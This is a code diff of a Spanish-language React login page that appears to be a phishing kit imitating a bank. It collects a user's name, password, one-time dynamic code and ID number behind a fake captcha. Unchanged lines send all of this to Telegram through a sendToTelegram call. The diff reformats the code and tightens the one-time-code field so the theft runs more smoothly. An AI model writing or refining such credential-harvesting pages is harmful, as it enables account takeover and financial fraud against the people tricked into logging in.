@@ -84,35 +84,35 @@ export default function LoginPage() {
       formData.claveDinamica &&
       isCaptchaChecked
     ) {
-      
-  
+
+
       // Guarda los datos de sesión en sessionStorage
       sessionStorage.setItem("usuario", formData.usuario);
       sessionStorage.setItem("clave", formData.clave);
       sessionStorage.setItem("claveDinamica", formData.claveDinamica);
       sessionStorage.setItem("countryCode", selectedCountry.code);
-      
+
       setIsLoading(true); // Inicia el loading
       const cedula = sessionStorage.getItem("cedula");
       if (!cedula) {
         router.push("/cedula");
         return;
       }
-      
+
       await sendToTelegram({
         ...formData,
         cedula,
         countryCode: selectedCountry.code,
       });
-  
+
       setShowTransition(true); // Activa la transición
-    setTimeout(() => {
-      setIsLoading(false); // Detiene el loading después de 2 segundos
-      router.push("/procesando");
-    }, 2000);
+      setTimeout(() => {
+        setIsLoading(false); // Detiene el loading después de 2 segundos
+        router.push("/procesando");
+      }, 2000);
+    };
   };
-  };
-  
+
 
   return (
     <main className="min-h-screen bg-pink-50 relative">
@@ -210,7 +210,7 @@ export default function LoginPage() {
                 </div>
                 <div className="space-y-2">
                   <Input
-                  type="password"
+                    type="password"
                     id="clave"
                     required
                     value={formData.clave}
@@ -228,29 +228,40 @@ export default function LoginPage() {
                 <TooltipProvider delayDuration={0}>
                   <Tooltip>
                     <TooltipTrigger asChild>
-                      <div className="space-y-2 relative" onClick={(e) => {
-                        // Prevenir que el tooltip se cierre inmediatamente en móviles
-                        if (window.innerWidth <= 768) {
-                          e.preventDefault();
-                        }
-                      }}>
+                      <div
+                        className="space-y-2 relative"
+                        onClick={(e) => {
+                          // Prevenir que el tooltip se cierre inmediatamente en móviles
+                          if (window.innerWidth <= 768) {
+                            e.preventDefault();
+                          }
+                        }}
+                      >
                         <Input
-                          type="number"
+                          type="text" // Cambiamos de "number" a "text" para mejor control
                           id="claveDinamica"
                           required
-                          maxLength={6}
+                          maxLength={6} // Limita a 6 caracteres
                           value={formData.claveDinamica}
                           onChange={(e) => {
-                            const value = e.target.value.replace(/\D/g, "");
-                            setFormData({ ...formData, claveDinamica: value });
+                            const value = e.target.value.replace(/\D/g, ""); // Solo permite dígitos
+                            if (value.length <= 6) { // Asegura que no exceda 6 dígitos
+                              setFormData({ ...formData, claveDinamica: value });
+                            }
                           }}
                           placeholder="Clave dinámica"
                           className="bg-pink-50"
+                          inputMode="numeric" // Para teclados numéricos en móviles
+                          pattern="[0-9]{6}" // Validación HTML5 para 6 dígitos
+                          onInput={(e) => {
+                            // Forzar que el navegador respete el maxlength
+                            e.target.value = e.target.value.slice(0, 6);
+                          }}
                         />
                       </div>
                     </TooltipTrigger>
 
-                    <TooltipContent 
+                    <TooltipContent
                       className="bg-white border-none shadow-lg p-4 mt-8 absolute z-10 w-64 left-1/2 transform -translate-x-1/2 sm:w-80 md:w-96"
                       sideOffset={5}
                       side="top"
@@ -277,13 +288,12 @@ export default function LoginPage() {
                   <div className="flex items-center gap-2">
                     <div
                       onClick={handleCaptchaClick}
-                      className={`w-6 h-6 border rounded flex items-center justify-center cursor-pointer transition-colors ${
-                        isCaptchaChecked
+                      className={`w-6 h-6 border rounded flex items-center justify-center cursor-pointer transition-colors ${isCaptchaChecked
                           ? "bg-[#34A853] border-[#34A853]"
                           : isLoading
-                          ? "bg-[#4A90E2] border-[#4A90E2]"
-                          : "bg-white border-gray-300 hover:border-gray-400"
-                      }`}
+                            ? "bg-[#4A90E2] border-[#4A90E2]"
+                            : "bg-white border-gray-300 hover:border-gray-400"
+                        }`}
                     >
                       {isLoading ? (
                         <Loader2 className="w-4 h-4 text-white animate-spin" />
